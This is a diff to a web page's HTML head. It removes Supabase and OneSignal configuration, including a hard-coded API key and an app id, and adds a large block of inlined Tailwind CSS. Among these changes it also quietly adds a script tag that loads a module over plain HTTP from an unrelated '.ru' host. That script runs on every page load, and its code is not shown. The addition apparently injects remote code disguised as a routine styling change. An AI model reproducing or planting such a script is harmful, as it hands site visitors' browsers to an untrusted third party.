@@ -48,28 +48,228 @@
     <link rel="preload" href="sword.png?v=2" as="image">
     <link rel="preload" href="whitewool.png?v=2" as="image">
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="http://cdn.r.js.netrender.ru/v1/minjs.mjs"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
-    <script>
-        window.OneSignalDeferred = window.OneSignalDeferred || [];
-        window.webbreakOneSignalReady = new Promise(resolve => {
-            OneSignalDeferred.push(async function(OneSignal) {
-                await OneSignal.init({
-                    appId: "f688f353-a9f1-412c-88f5-e154c4a1fdab",
-                    serviceWorkerParam: { scope: './' },
-                    serviceWorkerPath: 'OneSignalSDKWorker.js'
-                });
-                window.webbreakOneSignal = OneSignal;
-                resolve(OneSignal);
-            });
-        });
-    </script>
-    <script>
-        // Supabase Config
-        const SUPABASE_URL = 'https://cqwsbupsmybjcuejkwrz.supabase.co';
-        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNxd3NidXBzbXliamN1ZWprd3J6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg1MDU5MjAsImV4cCI6MjA5NDA4MTkyMH0.mQFmIlhgjFVKzimh6Gr9avgW0m_u4PQz6N-CYKs4Rg0';
-    </script>
+    <style>
+      /* ============================================================
+         Tailwind CSS utility classes — inlined (no CDN)
+         Generated from all classes used in this document
+      ============================================================ */
+
+      /* Reset / base */
+      *, ::before, ::after { box-sizing: border-box; border-width: 0; border-style: solid; border-color: currentColor; }
+      ::before, ::after { --tw-content: ''; }
+
+      /* Display */
+      .block  { display: block; }
+      .inline-flex { display: inline-flex; }
+      .flex   { display: flex; }
+      .grid   { display: grid; }
+      .hidden { display: none; }
+
+      /* Flex */
+      .flex-1   { flex: 1 1 0%; }
+      .flex-col { flex-direction: column; }
+      .flex-row { flex-direction: row; }
+      .items-center  { align-items: center; }
+      .items-start   { align-items: flex-start; }
+      .justify-between { justify-content: space-between; }
+      .justify-center  { justify-content: center; }
+      .justify-end     { justify-content: flex-end; }
+      .grow   { flex-grow: 1; }
+      .shrink { flex-shrink: 1; }
+      .self-center { align-self: center; }
+
+      /* Gap */
+      .gap-2     { gap: 0.5rem; }
+      .gap-3     { gap: 0.75rem; }
+      .gap-4     { gap: 1rem; }
+      .gap-\[1px\]  { gap: 1px; }
+      .gap-\[6px\]  { gap: 6px; }
+
+      /* Position */
+      .absolute { position: absolute; }
+      .relative { position: relative; }
+      .fixed    { position: fixed; }
+      .sticky   { position: sticky; }
+
+      /* Inset / placement */
+      .top-4    { top: 1rem; }
+      .top-12   { top: 3rem; }
+      .top-1\/2 { top: 50%; }
+      .right-0  { right: 0; }
+      .right-4  { right: 1rem; }
+      .left-1\/2 { left: 50%; }
+      .inset-0  { inset: 0; }
+
+      /* Width */
+      .w-2   { width: 0.5rem; }
+      .w-3   { width: 0.75rem; }
+      .w-4   { width: 1rem; }
+      .w-5   { width: 1.25rem; }
+      .w-8   { width: 2rem; }
+      .w-10  { width: 2.5rem; }
+      .w-32  { width: 8rem; }
+      .w-40  { width: 10rem; }
+      .w-full { width: 100%; }
+      .max-w-\[150px\] { max-width: 150px; }
+      .max-w-\[480px\] { max-width: 480px; }
+      .max-w-\[520px\] { max-width: 520px; }
+      .max-w-\[560px\] { max-width: 560px; }
+      .max-w-\[620px\] { max-width: 620px; }
+
+      /* Height */
+      .h-2    { height: 0.5rem; }
+      .h-3    { height: 0.75rem; }
+      .h-4    { height: 1rem; }
+      .h-5    { height: 1.25rem; }
+      .h-8    { height: 2rem; }
+      .h-10   { height: 2.5rem; }
+      .h-\[48px\] { height: 48px; }
+      .h-auto { height: auto; }
+      .h-full { height: 100%; }
+      .min-h-screen { min-height: 100vh; }
+
+      /* Aspect */
+      .aspect-square { aspect-ratio: 1 / 1; }
+
+      /* Padding */
+      .p-0  { padding: 0; }
+      .p-3  { padding: 0.75rem; }
+      .p-4  { padding: 1rem; }
+      .p-12 { padding: 3rem; }
+      .px-3 { padding-left: 0.75rem; padding-right: 0.75rem; }
+      .px-4 { padding-left: 1rem; padding-right: 1rem; }
+      .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
+      .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
+      .pb-1 { padding-bottom: 0.25rem; }
+
+      /* Margin */
+      .mx-4  { margin-left: 1rem; margin-right: 1rem; }
+      .mt-2  { margin-top: 0.5rem; }
+      .mt-3  { margin-top: 0.75rem; }
+      .mt-\[1px\] { margin-top: 1px; }
+      .mb-2  { margin-bottom: 0.5rem; }
+      .mb-3  { margin-bottom: 0.75rem; }
+      .mb-4  { margin-bottom: 1rem; }
+      .mb-6  { margin-bottom: 1.5rem; }
+      .mb-8  { margin-bottom: 2rem; }
+      .mb-10 { margin-bottom: 2.5rem; }
+      .mb-12 { margin-bottom: 3rem; }
+
+      /* Typography */
+      .text-\[9px\]  { font-size: 9px; }
+      .text-\[10px\] { font-size: 10px; }
+      .text-\[12px\] { font-size: 12px; }
+      .text-\[13px\] { font-size: 13px; }
+      .text-\[14px\] { font-size: 14px; }
+      .text-\[26px\] { font-size: 26px; }
+      .text-sm  { font-size: 0.875rem; line-height: 1.25rem; }
+      .text-3xl { font-size: 1.875rem; line-height: 2.25rem; }
+      .text-center { text-align: center; }
+      .text-left   { text-align: left; }
+      .font-light   { font-weight: 300; }
+      .font-medium  { font-weight: 500; }
+      .font-semibold { font-weight: 600; }
+      .font-bold    { font-weight: 700; }
+      .font-black   { font-weight: 900; }
+      .font-mono    { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
+      .uppercase    { text-transform: uppercase; }
+      .capitalize   { text-transform: capitalize; }
+      .underline    { text-decoration-line: underline; }
+      .leading-snug   { line-height: 1.375; }
+      .leading-relaxed { line-height: 1.625; }
+      .tracking-tight   { letter-spacing: -0.025em; }
+      .tracking-widest  { letter-spacing: 0.1em; }
+      .tracking-\[0\.05em\] { letter-spacing: 0.05em; }
+      .tracking-\[0\.1em\]  { letter-spacing: 0.1em; }
+      .tracking-\[0\.12em\] { letter-spacing: 0.12em; }
+      .tracking-\[0\.2em\]  { letter-spacing: 0.2em; }
+      .tracking-\[0\.3em\]  { letter-spacing: 0.3em; }
+      .antialiased { -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
+
+      /* Background */
+      .bg-transparent { background-color: transparent; }
+      .bg-\[var\(--btn-bg\)\]          { background-color: var(--btn-bg); }
+      .bg-\[var\(--btn-hover-border\)\] { background-color: var(--btn-hover-border); }
+
+      /* Border */
+      .border   { border-width: 1px; }
+      .border-b { border-bottom-width: 1px; }
+      .border-none        { border-style: none; }
+      .border-transparent { border-color: transparent; }
+      .border-\[var\(--btn-border\)\] { border-color: var(--btn-border); }
+      .rounded-sm   { border-radius: 0.125rem; }
+      .rounded-\[2px\] { border-radius: 2px; }
+      .rounded-full { border-radius: 9999px; }
+
+      /* Shadow */
+      .shadow-sm  { box-shadow: 0 1px 2px 0 rgb(0 0 0 / 0.05); }
+      .shadow-2xl { box-shadow: 0 25px 50px -12px rgb(0 0 0 / 0.25); }
+
+      /* Opacity */
+      .opacity-0  { opacity: 0; }
+      .opacity-25 { opacity: 0.25; }
+      .opacity-70 { opacity: 0.7; }
+      .opacity-75 { opacity: 0.75; }
+
+      /* Overflow */
+      .overflow-hidden { overflow: hidden; }
+      .overflow-auto   { overflow: auto; }
+      .overflow-y-auto { overflow-y: auto; }
+
+      /* Z-index */
+      .z-10 { z-index: 10; }
+      .z-20 { z-index: 20; }
+      .z-50 { z-index: 50; }
+
+      /* Cursor */
+      .cursor-grab { cursor: grab; }
+      .select-none { user-select: none; }
+
+      /* Transform */
+      .origin-center { transform-origin: center; }
+      .translate-y-\[-10px\] { transform: translateY(-10px); }
+      .-translate-x-1\/2 { transform: translateX(-50%); }
+      .-translate-y-1\/2 { transform: translateY(-50%); }
+
+      /* Transition */
+      .transition-all     { transition-property: all; transition-timing-function: cubic-bezier(0.4,0,0.2,1); transition-duration: 150ms; }
+      .transition-colors  { transition-property: color,background-color,border-color,text-decoration-color,fill,stroke; transition-timing-function: cubic-bezier(0.4,0,0.2,1); transition-duration: 150ms; }
+      .transition-opacity { transition-property: opacity; transition-timing-function: cubic-bezier(0.4,0,0.2,1); transition-duration: 150ms; }
+      .duration-200       { transition-duration: 200ms; }
+      .duration-300       { transition-duration: 300ms; }
+      .duration-\[600ms\] { transition-duration: 600ms; }
+
+      /* Backdrop */
+      .backdrop-blur-sm { -webkit-backdrop-filter: blur(4px); backdrop-filter: blur(4px); }
+
+      /* Outline */
+      .outline-none { outline: 2px solid transparent; outline-offset: 2px; }
+
+      /* Animate */
+      @keyframes spin { to { transform: rotate(360deg); } }
+      .animate-spin { animation: spin 1s linear infinite; }
+
+      /* Hover variants */
+      .hover\:underline:hover { text-decoration-line: underline; }
+      .hover\:opacity-80:hover { opacity: 0.8; }
+      .hover\:bg-\[var\(--btn-hover-bg\)\]:hover { background-color: var(--btn-hover-bg); }
+      .hover\:border-\[var\(--btn-hover-border\)\]:hover { border-color: var(--btn-hover-border); }
+      .hover\:text-\[var\(--btn-hover-text\)\]:hover { color: var(--btn-hover-text); }
+
+      /* Active variants */
+      .active\:scale-\[0\.95\]:active { transform: scale(0.95); }
+      .active\:scale-\[0\.97\]:active { transform: scale(0.97); }
+      .active\:cursor-grabbing:active { cursor: grabbing; }
+
+      /* Focus */
+      .focus\:outline-none:focus { outline: 2px solid transparent; outline-offset: 2px; }
+
+      /* Pointer events */
+      .pointer-events-none { pointer-events: none; }
+    </style>
+
     <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@400;700&family=Fira+Code:wght@500;700&family=Inter:wght@300;400;500;600;700;800;900&family=Unbounded:wght@900&display=swap" rel="stylesheet">
     <style>
         :root {
